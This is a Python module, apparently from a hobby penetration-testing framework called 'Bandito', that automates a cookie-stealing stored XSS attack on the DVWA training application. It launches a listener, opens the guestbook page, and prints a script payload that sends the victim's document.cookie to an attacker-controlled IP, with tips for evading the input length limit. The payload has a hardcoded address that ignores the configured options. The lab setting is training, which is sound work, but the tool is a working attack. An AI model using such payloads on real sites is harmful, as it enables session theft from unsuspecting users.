from base_module import BaseModule
from utils import colored
import subprocess
import webbrowser
import os
import socket

class DVWAStoredXSS(BaseModule):
    def __init__(self):
        super().__init__()
        self.name = "dvwa_stored_xss"
        self.description = "DVWA Stored XSS Cookie Stealer (Part 4)"

        self.options = {
            "RHOST": {"value": "", "required": True, "description": "Target DVWA IP or URL"},
            "LHOST": {"value": self.get_local_ip(), "required": True, "description": "Your Kali IP for cookie exfil"},
            "LPORT": {"value": "8080", "required": True, "description": "HTTP server port to receive cookies"},
        }

        self.server_process = None

    def get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"

    def show_options(self):
        print(colored(f"\nModule options ({self.name}):", "orange"))

        options = [
            ("RHOST", self.options["RHOST"]["value"], "yes", self.options["RHOST"]["description"]),
            ("LHOST", self.options["LHOST"]["value"], "yes", self.options["LHOST"]["description"]),
            ("LPORT", str(self.options["LPORT"]["value"]), "yes", self.options["LPORT"]["description"]),
        ]


        max_name = max(len(name) for name, _, _, _ in options)
        max_value = max(len(str(value)) for _, value, _, _ in options)
        max_req = max(len(required) for _, _, required, _ in options)

       
        name_width = max(15, max_name + 2)
        value_width = max(30, max_value + 2)
        req_width = max(10, max_req + 2)

        header = f"{'Name':<{name_width}} {'Current Setting':<{value_width}} {'Required':<{req_width}} Description"
        print(colored(header, "yellow"))
        print("-" * (name_width + value_width + req_width + 30))  

        for name, value, required, desc in options:
      
            value_str = str(value)[:value_width-3] + "..." if len(str(value)) > value_width-3 else str(value)
            print(f"{name:<{name_width}} {colored(value_str, 'green'):<{value_width}} {colored(required, 'red'):<{req_width}} {desc}")

    def show_help(self):
        print(colored("\n=== DVWA Stored XSS Module (Part 4) ===", "orange"))
        print("This module helps with Stored XSS cookie stealing (no redirects)")
        print("Make sure to set your RHOST, LHOST, and LPORT manually before running setup")
        print("Commands:")
        print("  setup              - Start HTTP server + open Stored XSS page")
        print("  generate           - Generate stored XSS payload (will be upgrading to msfvenom later)")
        print("  set <option> <value> - Set RHOST, LHOST, LPORT")
        print("  show options       - Show current settings")
        print("  help               - Show this help")
        print("  back / exit        - Return to framework (stops server)\n")
        print("For Part 4: Use 'setup' → 'generate' → paste in Guestbook → refresh page")

    def handle_command(self, cmd_input):
        cmd = cmd_input.strip()
        low = cmd.lower()

        if low in ["help", "show options"]:
            self.show_options()
            self.show_help()
            return

        if low.startswith("set "):
            parts = cmd.split(maxsplit=2)
            if len(parts) < 3:
                print("Usage: set <option> <value>")
                return
            option = parts[1].upper()
            value = parts[2]

            if option in self.options:
                self.options[option]["value"] = value
                print(colored(f"{option} → {value}", "green"))
            else:
                print(colored(f"Unknown option: {option}", "red"))
            return

        if low == "setup":
            self.start_http_server()
            self.open_stored_xss_page()
            return

        if low == "generate":
            self.generate_stored_payload()
            return

        if low in ["back", "exit", "quit"]:
            if self.server_process:
                print(colored("[*] Stopping HTTP server...", "yellow"))
                self.server_process.terminate()
            print(colored("[*] Returning to Bandito framework...", "yellow"))
            return

        print(colored(f"[-] Unknown command: {cmd}", "red"))
        print("Type 'help' for available commands.")

    def start_http_server(self):
        lhost = self.options["LHOST"]["value"]
        lport = self.options["LPORT"]["value"]

        print(colored(f"[*] Starting HTTP server on http://{lhost}:{lport}", "yellow"))

        cmd = f"python3 -m http.server {lport}"
        try:
            self.server_process = subprocess.Popen(["gnome-terminal", "--", "bash", "-c", cmd + "; echo 'HTTP server running - press Enter to close...'; read"])
            print(colored("[+] HTTP server started in new terminal", "green"))
        except:
            try:
                self.server_process = subprocess.Popen(["xterm", "-e", cmd])
                print(colored("[+] HTTP server started in xterm", "green"))
            except:
                print(colored("[-] Could not open new terminal. Run manually:", "red"))
                print(f"    {cmd}")

    def open_stored_xss_page(self):
        rhost = self.options["RHOST"]["value"]
        url = f"http://{rhost}/vulnerabilities/xss_s/"
        print(colored(f"[+] Opening DVWA Stored XSS page: {url}", "yellow"))
        webbrowser.open(url)

    def generate_stored_payload(self):
        lhost = self.options["LHOST"]["value"]
        lport = self.options["LPORT"]["value"]

        payload = f"<script>new Image().src='http://192.168.107.128:8080/?cookie='+encodeURIComponent(document.cookie);</script>"

        print(colored("\n=== Stored XSS Payload (Part 4) ===", "orange"))
        print("Paste this into the **Message** field in DVWA Stored XSS Guestbook → Submit")
        print("NOTE: here you may need to increase the message limit size. Right-click > inspect the element, change MAXLENGTH=300")
        print("Then refresh the page (use new tab/incognito if resend warning appears)")
        print(colored("="*80, "yellow"))
        print(payload)
        print(colored("="*80, "yellow"))

        try:
            subprocess.run(["xclip", "-sel", "clip"], input=payload.encode(), check=True)
            print(colored("[+] Payload copied to clipboard!", "green"))
        except:
            print(colored("[+] Copy the payload above manually", "yellow"))

        print(colored(f"\nAfter posting, refresh Guestbook page → check HTTP server for GET /c?... with cookies. You can initiate the grab by refreshing the page.", "yellow"))